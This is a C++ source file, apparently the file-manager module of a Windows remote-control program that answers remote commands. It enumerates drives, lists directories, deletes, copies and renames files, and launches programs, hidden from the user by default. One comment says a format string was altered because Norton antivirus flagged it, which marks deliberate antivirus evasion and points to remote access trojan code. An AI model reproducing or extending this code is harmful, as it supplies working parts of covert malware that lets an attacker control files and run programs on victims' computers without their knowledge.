#include "StdAfx.h"
#include "FileOperator.h"
#include <stdio.h>
#include <shellapi.h>
#include "shlwapi.h"
#include "Functions.h"

#if _MSC_VER > 1200
#define sprintf sprintf_s
#endif

void FileListDirver(char *pBuf, LPMsgHead lpMsgHead)
{
    DriverInfo Driver;
    DWORD Offset = 0;
    SHFILEINFO sfi;

    for (char chDriver = 'A'; chDriver <= 'Z'; chDriver++) {
        ZeroMemory(&Driver, sizeof(DriverInfo));
        sprintf(Driver.driver, "%c:\\", chDriver);
        Driver.drivertype = GetDriveTypeA(Driver.driver);
        if (Driver.drivertype >= 2) { //如驱动器不能识别，则返回0。如指定的目录不存在，则返回1
            SHGetFileInfo(Driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
            lstrcpy(Driver.display, sfi.szDisplayName);

            memcpy(pBuf + Offset, &Driver, sizeof(DriverInfo));
            Offset += sizeof(DriverInfo);
        }
    }

    lpMsgHead->dwCmd = CMD_SUCCEED;
    lpMsgHead->dwSize = Offset;
}

//枚举文件路径
void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead)
{
    HANDLE hFile;
    WIN32_FIND_DATA WFD;

    SHFILEINFO shfi;
    SYSTEMTIME systime;
    FILETIME localtime;

    FileInfo m_FileInfo;
    DWORD dwLen = 0;

    //查找第一个文件
    pBuf[lpMsgHead->dwSize] = 0;
    if ((hFile = FindFirstFile(pBuf, &WFD)) == INVALID_HANDLE_VALUE) {
        //文件夹不可读，目录无法访问
        lpMsgHead->dwCmd = CMD_DIRFLODERERR;
        lpMsgHead->dwSize = 0;
        return;
    }

    do {	//查完所有信息
        memset(&shfi, 0, sizeof(shfi));
        SHGetFileInfo(WFD.cFileName,
                      FILE_ATTRIBUTE_NORMAL,
                      &shfi, sizeof(shfi),
                      SHGFI_ICON | SHGFI_USEFILEATTRIBUTES | SHGFI_TYPENAME
                     );

        if (lstrcmp(WFD.cFileName, ".") == 0 || lstrcmp(WFD.cFileName, "..") == 0)
            continue; //Ignore

        //写入文件信息结构
        ZeroMemory(&m_FileInfo, sizeof(FileInfo));
        lstrcpyn(m_FileInfo.cFileName, WFD.cFileName, 64);	//文件名

        if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { //And Operate
            m_FileInfo.iType = 1;	//目录
            // lstrcpy(m_FileInfo.cAttrib, "文件夹");		//文件属性
        } else {
            m_FileInfo.iType = 2; //文件
            DWORD dwSize = WFD.nFileSizeLow; //文件大小

            if (WFD.nFileSizeHigh != 0 || dwSize > 1024 * 1024 * 1024) {
                sprintf(m_FileInfo.cSize, "%-4.2f GB", (float)WFD.nFileSizeHigh * 4 + (float)dwSize / 1024 / 1024 / 1024);
            } else if (dwSize < 1024)
                sprintf(m_FileInfo.cSize, "%-4d B", dwSize);
            else if (dwSize > 1024 && dwSize < 1024 * 1024)
                sprintf(m_FileInfo.cSize, "%-4.2f KB", (float)dwSize / 1024); //这个格式化的字符串被诺顿杀了，所以KB前2个空格
            else if (dwSize > 1024 * 1024 && dwSize < 1024 * 1024 * 1024)
                sprintf(m_FileInfo.cSize, "%-4.2f MB", (float)dwSize / 1024 / 1024);
            else
                sprintf(m_FileInfo.cSize, "Unknown");

            lstrcpy(m_FileInfo.cAttrib, shfi.szTypeName); //文件属性
        }

        //转化格林时间到本地时间
        FileTimeToLocalFileTime(&WFD.ftLastWriteTime, &localtime);
        FileTimeToSystemTime(&localtime, &systime);
        wsprintf(m_FileInfo.cTime, "%4d-%02d-%02d %02d:%02d:%02d",
                 systime.wYear, systime.wMonth, systime.wDay, systime.wHour, systime.wMinute, systime.wSecond
                );

        memcpy(pBuf + dwLen, &m_FileInfo, sizeof(FileInfo));
        dwLen += sizeof(FileInfo);

        if (GetLastError() == ERROR_NO_MORE_FILES)
            break;
    } while (FindNextFile(hFile, &WFD));

    FindClose(hFile);

    lpMsgHead->dwCmd = CMD_SUCCEED;
    lpMsgHead->dwSize = dwLen;
}

void FileDelete(char *pBuf, LPMsgHead lpMsgHead)
{
    FileOpt m_FileOpt;
    memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

    if (DeleteFile(m_FileOpt.cScrFile))
        lpMsgHead->dwCmd = CMD_SUCCEED;
    else
        lpMsgHead->dwCmd = CMD_FAILED;
    lpMsgHead->dwSize = 0;
}

void FileExec(char *pBuf, LPMsgHead lpMsgHead)
{
    FileOpt m_FileOpt;
    memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

    DWORD ShowState = SW_HIDE;
    if (m_FileOpt.iSize >= 0) { //No hide
        ShowState = SW_NORMAL;

        if (!OpenUserDesktop()) {
            lpMsgHead->dwCmd = CMD_FAILED;
            lpMsgHead->dwSize = 0;
            return;
        }
    }

    HINSTANCE hInst = ::ShellExecute(NULL, "open", m_FileOpt.cScrFile, NULL, NULL, ShowState);
    if ((INT)hInst < 32) //若返回值小于32出现错误
        lpMsgHead->dwCmd = CMD_FAILED;
    else
        lpMsgHead->dwCmd = CMD_SUCCEED;

    lpMsgHead->dwSize = 0;
    return;
}

void FilePaste(char *pBuf, LPMsgHead lpMsgHead)
{
    FileOpt m_FileOpt;
    memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

    if (CopyFile(m_FileOpt.cScrFile, m_FileOpt.cDstFile, TRUE))
        lpMsgHead->dwCmd = CMD_SUCCEED;
    else
        lpMsgHead->dwCmd = CMD_FAILED;
    lpMsgHead->dwSize = 0;
}

void FileReName(char *pBuf, LPMsgHead lpMsgHead)
{
    FileOpt m_FileOpt;
    memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

    if (MoveFile(m_FileOpt.cScrFile, m_FileOpt.cDstFile))
        lpMsgHead->dwCmd = CMD_SUCCEED;
    else
        lpMsgHead->dwCmd = CMD_FAILED;
    lpMsgHead->dwSize = 0;
}
